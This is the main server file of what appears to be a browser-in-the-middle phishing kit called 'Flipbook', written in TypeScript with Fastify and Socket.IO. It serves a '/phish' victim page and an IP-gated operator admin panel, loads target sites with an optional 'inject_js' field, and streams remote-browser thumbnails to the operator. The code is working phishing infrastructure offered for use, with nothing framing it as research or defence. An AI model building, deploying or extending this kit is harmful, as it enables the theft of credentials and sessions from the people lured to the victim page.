import { readFile } from 'fs/promises';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import Fastify from 'fastify';
import { Server } from 'socket.io';
import fastifyStatic from '@fastify/static';
import { z } from 'zod';
import type { Config, Target, ClientToServerEvents, ServerToClientEvents, SocketData } from './types.js';
import { initBrowserManager, warmUp, closeAll } from './browser-manager.js';
import { registerSocketHandlers } from './socket-handlers.js';

const __dirname = dirname(fileURLToPath(import.meta.url));

// ─── Config schemas ───────────────────────────────────────────────────────────

const ConfigSchema = z.object({
  default_user_agent: z.string(),
  socket_key: z.string().min(8),
  admin_ips: z.array(z.string()),
  proxy: z.string().nullable(),
});

const TargetSchema = z.object({
  name: z.string(),
  url: z.string().url(),
  width: z.number().int().positive(),
  height: z.number().int().positive(),
  inject_js: z.string().optional(),
});

const TargetsSchema = z.record(TargetSchema);

// ─── Load config ──────────────────────────────────────────────────────────────

async function loadConfig(): Promise<Config> {
  const configPath = join(__dirname, '..', 'config.json');
  const raw = await readFile(configPath, 'utf-8');
  return ConfigSchema.parse(JSON.parse(raw));
}

async function loadTargets(): Promise<Record<string, Target>> {
  const targetsPath = join(__dirname, '..', 'targets.json');
  const raw = await readFile(targetsPath, 'utf-8');
  return TargetsSchema.parse(JSON.parse(raw));
}

// ─── Main ─────────────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  const [config, targets] = await Promise.all([loadConfig(), loadTargets()]);

  const publicDir = join(__dirname, '..', 'public');

  // ─── Fastify setup ──────────────────────────────────────────────────────────

  const fastify = Fastify({
    logger: {
      level: 'info',
      transport: { target: 'pino-pretty', options: { colorize: true } },
    },
  });

  // Serve static files from public/
  await fastify.register(fastifyStatic, {
    root: publicDir,
    prefix: '/',
  });

  // Socket.IO — attached directly to the underlying HTTP server
  const io = new Server<ClientToServerEvents, ServerToClientEvents, Record<string, never>, SocketData>(
    fastify.server,
    {
      cors: { origin: '*', methods: ['GET', 'POST'] },
      transports: ['websocket'], // polling mangles binary frame data
    },
  );

  // ─── Routes ─────────────────────────────────────────────────────────────────

  // Serve victim page
  fastify.get('/phish', async (_req, reply) => {
    return reply.sendFile('victim.html');
  });

  // Serve admin page (IP-gated)
  fastify.get('/admin', async (req, reply) => {
    const ip = req.ip;
    if (!config.admin_ips.includes(ip) && !config.admin_ips.includes('*')) {
      return reply.code(403).send('Forbidden');
    }
    return reply.sendFile('admin.html');
  });

  // Health check
  fastify.get('/healthz', async () => ({ status: 'ok' }));

  // ─── Socket.IO auth middleware ───────────────────────────────────────────────

  io.use((socket, next) => {
    const auth = socket.handshake.auth as { password?: string; isAdmin?: boolean };
    const ip = socket.handshake.address;

    if (auth.isAdmin) {
      const isAdminIp =
        config.admin_ips.includes(ip) || config.admin_ips.includes('*');
      const hasCorrectKey = auth.password === config.socket_key;
      if (!isAdminIp || !hasCorrectKey) {
        return next(new Error('Unauthorized'));
      }
      socket.data.isAdmin = true;
    } else {
      socket.data.isAdmin = false;
    }

    return next();
  });

  // ─── Browser manager + socket handlers ──────────────────────────────────────

  initBrowserManager(config, (browserId, buf) => {
    io.to('admin').emit('thumbnail', { browserId, data: buf });
  });

  await warmUp();

  registerSocketHandlers(io, targets);

  // ─── Start server ────────────────────────────────────────────────────────────

  const port = parseInt(process.env['PORT'] ?? '80', 10);
  const host = process.env['HOST'] ?? '0.0.0.0';

  await fastify.listen({ port, host });
  console.log(`\n[server] Flipbook running at http://${host}:${port}`);
  console.log(`[server] Admin panel: http://localhost:${port}/admin`);
  console.log(`[server] Victim page: http://localhost:${port}/phish\n`);

  // ─── Graceful shutdown ────────────────────────────────────────────────────────

  const shutdown = async () => {
    console.log('\n[server] Shutting down...');
    await closeAll();
    await fastify.close();
    process.exit(0);
  };

  process.on('SIGINT', () => void shutdown());
  process.on('SIGTERM', () => void shutdown());
}

main().catch((err) => {
  console.error('[server] Fatal error:', err);
  process.exit(1);
});
